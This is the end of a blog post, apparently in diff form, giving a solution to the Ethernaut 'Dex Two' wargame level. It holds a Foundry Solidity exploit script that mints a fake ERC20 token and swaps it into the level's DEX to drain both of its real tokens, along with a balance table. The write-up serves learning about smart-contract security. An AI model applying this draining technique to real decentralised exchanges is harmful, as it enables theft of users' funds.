+<h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &quot;lib/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IdexTwo &#123;</span><br><span class="line">    function swap(address from, address to, uint256 amount) external;</span><br><span class="line">    function approve(address spender, uint256 amount) external;</span><br><span class="line">    function token1() external view returns (address);</span><br><span class="line">    function token2() external view returns (address);</span><br><span class="line">    function balanceOf(address token, address account) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *     Step  |           DEX          |          Player</span><br><span class="line"> *           | token1 - token2 - WETH | token1 - token2 - WETH</span><br><span class="line"> *   ---------------------------------------------------------</span><br><span class="line"> *     Init  |   100     100     100  |    10      10     300</span><br><span class="line"> *   Swap 1  |     0     100     200  |   110      10     200</span><br><span class="line"> *   Swap 2  |     0       0     400  |   110     110       0</span><br><span class="line"> */</span><br><span class="line">contract DexTwoSolution is Script &#123;</span><br><span class="line">    function run() external &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        IdexTwo idex = IdexTwo(0x18517a9c6aC1a4f7f403F6C8F0308b1Dbd066109);</span><br><span class="line">        ExpToken exp = new ExpToken();</span><br><span class="line">        exp.approve(address(idex), 500);</span><br><span class="line">        exp.transfer(address(idex), 100);</span><br><span class="line">        address token1 = idex.token1();</span><br><span class="line">        address token2 = idex.token2();</span><br><span class="line">        console.log(&quot;token1Before&quot;, idex.balanceOf(token1, msg.sender));</span><br><span class="line">        console.log(&quot;token2Before&quot;, idex.balanceOf(token2, msg.sender));</span><br><span class="line">        console.log(&quot;ExpTokenBefore&quot;, exp.balanceOf(address(idex)));</span><br><span class="line">        idex.swap(address(exp), token1, 100);</span><br><span class="line">        idex.swap(address(exp), token2, 200);</span><br><span class="line">        console.log(&quot;token1After&quot;, idex.balanceOf(token1, msg.sender));</span><br><span class="line">        console.log(&quot;token2After&quot;, idex.balanceOf(token2, msg.sender));</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ExpToken is ERC20 &#123;</span><br><span class="line">    constructor() ERC20(&quot;ExpToken&quot;, &quot;EXP&quot;) &#123;</span><br><span class="line">        _mint(msg.sender, 400);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>D3
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2026/02/03/ethernaut4/" title="Ethernaut 21-23">http://example.com/2026/02/03/ethernaut4/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Web3-Security/" rel="tag"># Web3 Security</a>
+              <a href="/tags/Ethernaut/" rel="tag"># Ethernaut</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/02/ethernaut3/" rel="prev" title="Ethernaut 16-20">
+                  <i class="fa fa-angle-left"></i> Ethernaut 16-20
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">D3</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
